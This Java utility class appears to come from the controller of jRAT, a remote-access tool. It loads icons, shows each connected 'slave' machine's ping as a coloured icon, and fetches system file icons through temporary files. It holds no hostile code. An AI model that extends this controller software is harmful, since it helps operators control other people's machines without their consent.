package io.jrat.client.utils;

import io.jrat.client.Main;
import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;

import java.io.File;
import java.net.URL;
import java.util.Random;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.filechooser.FileSystemView;


public class IconUtils {

	public static ImageIcon getIcon(String name, boolean defaultfolder) {
		URL url;
		if (defaultfolder) {
			url = Main.class.getResource("/icons/" + name + ".png");
		} else {
			url = Main.class.getResource(name);
		}

		if (url != null) {
			return new ImageIcon(url);
		} else {
			return null;
		}
	}

	public static ImageIcon getIcon(String name) {
		return getIcon(name, true);
	}

	public static ImageIcon getPingIcon(Slave slave) {
		int ping = 0;
		if (slave.getPing() < 50) {
			ping = 0;
		} else if (slave.getPing() < 100) {
			ping = 1;
		} else if (slave.getPing() < 200) {
			ping = 2;
		} else if (slave.getPing() < 400) {
			ping = 3;
		} else if (slave.getPing() < 1000) {
			ping = 4;
		} else {
			ping = 5;
		}

		String str = null;

		if (Frame.pingmode == Frame.PING_ICON_DOT) {
			str = "/icons/ping" + ping + ".png";
		} else {
			if (ping == 0 || ping == 1) {
				str = "network_green";
			} else if (ping == 2 || ping == 3) {
				str = "network_yellow";
			} else if (ping == 4) {
				str = "network_red";
			} else {
				str = "network_offline";
			}
		}

		ImageIcon icon;

		if (Utils.pingicons.containsKey(str)) {
			icon = Utils.pingicons.get(str);
		} else if (Frame.pingmode == Frame.PING_ICON_DOT) {
			icon = new ImageIcon(Main.class.getResource(str));
			Utils.pingicons.put(str, icon);
		} else {
			icon = getIcon(str);
			Utils.pingicons.put(str, icon);
		}

		return icon;
	}

	public static ImageIcon getFileIcon(int mode) {
		if (mode == IconUtils.IMAGE_FILE) {
			return new ImageIcon(Main.class.getResource("/icons/file.png"));
		} else if (mode == IconUtils.IMAGE_FOLDER) {
			return new ImageIcon(Main.class.getResource("/icons/folder.png"));
		} else {
			return null;
		}
	}

	public static Icon getFolderIcon() {
		return getFileIconFromExtension("", true);
	}

	public static Icon getFileIconFromExtension(String f, boolean dir) {
		if (dir) {
			try {
				File temp = new File(System.getProperty("java.io.tmpdir") + "icon");
				temp.mkdirs();
				Icon icon = FileSystemView.getFileSystemView().getSystemIcon(temp);
				temp.delete();
				return icon;
			} catch (Exception ex) {
				return getFileIcon(IconUtils.IMAGE_FOLDER);
			}
		} else {
			try {
				File temp = File.createTempFile((new Random()).nextInt() + "", f.substring(f.lastIndexOf("."), f.length()));
				Icon icon = FileSystemView.getFileSystemView().getSystemIcon(temp);
				temp.delete();
				return icon;
			} catch (Exception ex) {
				return getFileIcon(IconUtils.IMAGE_FILE);
			}
		}
	}

	public static Icon getFileIcon(File f) {
		Icon icon = FileSystemView.getFileSystemView().getSystemIcon(f);
		return icon;
	}

	public static Icon getFileIcon(String f) {
		return getFileIcon(new File(f));
	}

	public static final int IMAGE_FOLDER = 0;
	public static final int IMAGE_FILE = 1;

}
